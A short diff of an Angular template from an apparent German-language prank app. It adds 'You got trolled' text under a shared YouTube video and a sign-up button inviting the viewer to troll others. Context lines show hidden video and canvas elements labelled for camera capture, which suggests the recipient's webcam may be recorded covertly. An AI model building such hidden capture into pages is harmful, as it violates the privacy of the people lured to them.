@@ -9,12 +9,18 @@
     } @else {
         @if (youtubeVideoId()) {
             <div class="youtube-section">
-                <h2>{{userName()}} hat dir ein video geschickt.</h2>
+                <h2>{{userName()}} hat dir ein video geschickt. Du wurdest getrollt.</h2>
                 <iframe title="youtube" [src]="getSafeUrl(youtubeVideoId())" width="560" height="315" allowfullscreen></iframe>
             </div>
+           
         }
 
     }
+    <div class="center">
+        <p><b>Willst du auch jemanden trollen? Dann klick hier!</b></p>
+                    <app-button text="Melde dich an" type="button" color="primary" (buttonClicked)="routeToRegistration()"></app-button>
+    </div>
+    
     <!-- Hidden video and canvas elements for camera capture - always rendered -->
     <video #videoElement style="display: none;"></video>
     <canvas #canvasElement style="display: none;"></canvas>
